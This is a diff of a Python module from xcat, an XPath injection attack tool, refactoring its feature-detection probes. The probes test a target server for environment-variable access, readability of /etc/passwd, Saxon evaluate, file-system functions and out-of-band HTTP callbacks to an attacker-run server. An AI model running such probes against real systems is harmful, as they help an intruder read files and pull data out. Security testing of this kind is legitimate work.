@@ -1,19 +1,14 @@
 import asyncio
 from typing import List, NamedTuple, Callable, Union
 
-from xcat.attack import AttackContext, check
-from xcat.injections import Injection
-from xpath import E, Expression
-from xpath.functions import (available_environment_variables, boolean,
-                             current_date_time, doc, doc_available,
-                             document_uri, encode_for_uri, ends_with, exists,
-                             generate_id, lower_case, normalize_space, string,
-                             string_length, string_to_codepoints,
-                             substring_before, unparsed_text_available)
-from xpath.functions.fs import current_dir
-from xpath.functions.saxon import evaluate
+from xpath import E, Expression, func, Functions
 
+from .attack import AttackContext, check
+from .injections import Injection
 from .algorithms import ASCII_SEARCH_SPACE
+
+fs_func = Functions('Q{http://expath.org/ns/file}')
+saxon_func = Functions('saxon:')
 
 
 class Feature(NamedTuple):
@@ -24,72 +19,81 @@ class Feature(NamedTuple):
 def test_oob(path):
     async def test_oob_inner(context: AttackContext, injector: Injection):
         async with context.start_oob_server() as ctx:
-            doc_expr = doc(f'{ctx.oob_host}{path}').add_path('/data') == ctx.oob_app['test_response_value']
+            doc_expr = func.doc(f'{ctx.oob_host}{path}').add_path('/data') == ctx.oob_app['test_response_value']
             return await check(
                 context,
                 injector(context.target_parameter_value, doc_expr)
             )
+
     return test_oob_inner
 
 
 features = [
     Feature('xpath-2',
             [
-                lower_case('A') == 'a',
-                ends_with('thetest', 'test'),
-                encode_for_uri('test') == 'test'
+                func.lower_case('A') == 'a',
+                func.ends_with('thetest', 'test'),
+                func.encode_for_uri('test') == 'test'
             ]),
     Feature('xpath-3',
             [
-                boolean(generate_id(E('/')))
+                func.boolean(func.generate_id(E('/')))
+            ]),
+    Feature('xpath-3.1',
+            [
+                func.contains_token('a', 'a')
             ]),
     Feature('normalize-space',
             [
-                normalize_space('  a  b ') == 'a b'
+                func.normalize_space('  a  b ') == 'a b'
             ]),
     Feature('substring-search',
             [
-                string_length(substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
-                string_length(substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
+                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'h')) == ASCII_SEARCH_SPACE.find('h'),
+                func.string_length(func.substring_before(ASCII_SEARCH_SPACE, 'o')) == ASCII_SEARCH_SPACE.find('o')
             ]),
     Feature('codepoint-search',
             [
-                string_to_codepoints("test")[1] == 116,
-                string_to_codepoints("test")[2] == 101,
-                string_to_codepoints("test")[3] == 115,
-                string_to_codepoints("test")[4] == 116,
+                func.string_to_codepoints("test")[1] == 116,
+                func.string_to_codepoints("test")[2] == 101,
+                func.string_to_codepoints("test")[3] == 115,
+                func.string_to_codepoints("test")[4] == 116,
             ]),
     Feature('environment-variables',
             [
-                exists(available_environment_variables())
+                func.exists(func.available_environment_variables())
             ]),
     Feature('document-uri',
             [
-                document_uri(E('/'))
+                func.document_uri(E('/'))
+            ]),
+    Feature('base-uri',
+            [
+                func.base_uri()
             ]),
     Feature('current-datetime',
             [
-                string(current_date_time())
+                func.string(func.current_dateTime())
             ]),
     Feature('unparsed-text',
             [
-                unparsed_text_available(document_uri(E('/')))
+                func.unparsed_text_available(func.document_uri(E('/')))
             ]),
     Feature('doc-function',
             [
-                doc_available(document_uri(E('/')))
+                func.doc_available(func.document_uri(E('/')))
             ]),
     Feature('linux',
             [
-                unparsed_text_available('/etc/passwd')
+                func.unparsed_text_available('/etc/passwd')
             ]),
     Feature('expath-file',
             [
-                string_length(current_dir()) > 0
+                func.string_length(fs_func.current_dir()) > 0
             ]),
     Feature('saxon',
             [
-                evaluate('1+1') == 2
+                saxon_func.evaluate('1+1') == 2
             ]),
     Feature('oob-http', [test_oob('/test/data')]),
     Feature('oob-entity-injection', [test_oob('/test/entity')])
